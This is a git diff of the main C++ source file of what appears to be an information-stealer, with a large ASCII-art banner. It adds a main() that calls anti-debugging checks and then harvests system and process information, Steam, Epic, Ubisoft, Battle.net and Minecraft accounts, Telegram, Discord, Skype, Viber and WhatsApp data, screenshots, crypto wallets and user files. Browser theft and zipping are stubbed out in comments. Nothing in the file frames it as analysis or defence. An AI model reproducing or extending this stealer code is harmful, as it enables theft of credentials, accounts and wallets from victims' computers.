@@ -1,4 +1,4 @@
-/*
+﻿/*
 |==================================================================================================================|
 |████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
 |╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
@@ -22,71 +22,107 @@
 -----------------------------------------------------------------
 */
 
-// all targets 
+//std:c++17
 
-namespace cursystem
+// main source code file
+
+#include "config/config.cpp"
+#include "scripts/scripts.h"
+#include "targets/targets.h"
+
+/// <summary>
+/// call secure functions
+/// </summary>
+void Functions();
+
+void SystemInfo();
+
+void Gaming();
+
+void Messengers();
+
+void Other();
+
+void Ending();
+
+/// <summary>
+/// Main function in the program. 
+/// Function binds and calls all other functions
+/// </summary>
+/// <param name="none"></param>
+/// <returns>0</returns>
+int main(void)
 {
-	/// <summary>
-	/// get processes
-	/// </summary>
-	void GetProcesses();
-
-	/// <summary>
-	/// get all installed progs in program files
-	/// </summary>
-	void GetProgs();
-
-	/// <summary>
-	/// get all needed info about system, hardware and software
-	/// </summary>
-	void GetSysInfo();
+	Functions();
+	
+	return 0;
 }
 
-namespace gaming 
+void Functions()
 {
-	void BattleNet();
+	if (!config::debuging)
+		antidebug::AntiDebug();
+	manager::MakeDirs();
 
-	void Epic();
+	SystemInfo();
 
-	void Minecraft();
+	Gaming();
 
-	void Steam();
+	Messengers();
 
-	void Ubisoft();
+	Other();
+
+	Ending();
 }
 
-namespace messengers 
+void SystemInfo() 
 {
-	void Telegram();
+	cursystem::GetProcesses();
 
-	void Discord();
+	cursystem::GetProgs();
 
-	void Skype();
-
-	void Viber();
-
-	void Whatsapp();
+	cursystem::GetSysInfo();
 }
 
-namespace wallets
+void Gaming() 
 {
-	void Wallets();
+	gaming::Steam();
+
+	gaming::Epic();
+
+	gaming::Ubisoft();
+
+	gaming::BattleNet();
+
+	gaming::Minecraft();
 }
 
-namespace images
+void Messengers() 
 {
-	void Screenshot();
+	messengers::Telegram();
+
+	messengers::Discord();
+
+	messengers::Skype();
+
+	messengers::Viber();
+
+	messengers::Whatsapp();
 }
 
-namespace files
+void Other()
 {
-	void Txt_files();
-	void File_Grabber();
+	images::Screenshot();
+	wallets::Wallets();
+	if (!config::enableFileGrubber)
+		files::Txt_files();
+	if (config::enableFileGrubber)
+		files::File_Grabber();
+	//browsers::Chromium();
+	//browsers::FireFox();
 }
 
-namespace browsers 
+void Ending() 
 {
-	void Chromium();
-
-	void FireFox();
+	//manager::MakeZip();
 }
